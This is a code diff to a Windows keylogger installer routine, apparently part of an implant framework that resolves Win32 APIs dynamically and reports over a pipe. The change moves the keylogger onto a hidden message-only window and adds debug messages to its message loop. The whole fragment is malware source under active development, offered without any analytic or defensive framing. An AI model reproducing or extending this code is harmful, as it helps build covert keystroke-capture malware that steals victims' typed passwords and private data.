@@ -63,8 +63,8 @@ auto DECLFN KeyloggerInstall(
     Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
 
 	// NEED TO FIX BELOW CODE : issue in creating a message-only window
-    //HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
-	HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, KEYLOG_CLASS_NAME, WS_OVERLAPPEDWINDOW & ~WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
+    HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
+	//HWND WindowHandle = Instance->Win32.CreateWindowExW(0, WinClass.lpszClassName, KEYLOG_CLASS_NAME, WS_OVERLAPPEDWINDOW & ~WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, Instance->Win32.GetModuleHandleA(NULL), NULL);
     DWORD err = NtCurrentTeb()->LastErrorValue;
 	Instance->Win32.DbgPrint("CreateWindowExW err: %d\n", err);
 
@@ -72,7 +72,7 @@ auto DECLFN KeyloggerInstall(
     teststr = "[*] Creating Message-Only Window...\n";
     Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
 
-	Instance->Win32.DbgPrint("\n\n=======================\n[+] WindowHandle: %p\n", WindowHandle);
+	Instance->Win32.DbgPrint("\n\n=======================\n[+] WindowHandle: %p\n\n", WindowHandle);
 
     if(! WindowHandle)
     {
@@ -108,6 +108,9 @@ auto DECLFN KeyloggerInstall(
     // enter the window message processing loop 
     while (Instance->Win32.GetMessageW(&Msg, NULL, 0, 0))
     {
+        teststr = "[+] Got a messageeee!!! need to process or whatever lol\n";
+        Instance->Win32.WriteFile(Instance->Pipe.Write, teststr, Str::LengthA(teststr), nullptr, 0);
+
         Instance->Win32.TranslateMessage(&Msg);
         Instance->Win32.DispatchMessageW(&Msg);
     }
